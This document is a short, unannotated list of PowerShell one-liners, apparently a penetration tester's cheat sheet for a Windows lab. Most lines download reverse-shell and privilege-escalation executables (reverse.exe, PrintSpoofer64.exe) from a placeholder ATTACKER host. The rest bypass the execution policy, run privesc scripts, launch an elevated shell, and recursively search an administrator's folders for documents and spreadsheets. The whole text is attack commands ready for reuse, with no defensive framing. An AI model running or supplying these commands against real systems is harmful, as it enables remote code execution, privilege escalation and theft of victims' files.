
```
powershell iwr -uri http://ATTACKER:80/reverse.exe -Outfile reverse.exe
```

```
powershell iwr -uri http://ATTACKER:80/reverse.exe -Outfile /Users/Public/reverse.exe
```

```
powershell iwr -uri http://ATTACKER:80/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

```
powershell iwr -uri http://ATTACKER:80/reverse.exe -Outfile C:\Users\Public\reverse.exe
```

```
powershell iwr -uri http://ATTACKER:80/KiteService.exe -Outfile KiteService.exe
```

```
PowerShell.exe -ExecutionPolicy UnRestricted -File .shell.ps1
```

```
powershell.exe 'C:\Tools\privesc.ps1'
```

```
powershell -ep bypass
```

```
powershell Get-ChildItem -Path C:\Users\administrator.MEDTECH\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -Verb RunAs"
```

```
powershell iwr -uri http://ATTACKER:80/reverse.exe -Outfile C:\Users\Public\reverse.exe
```

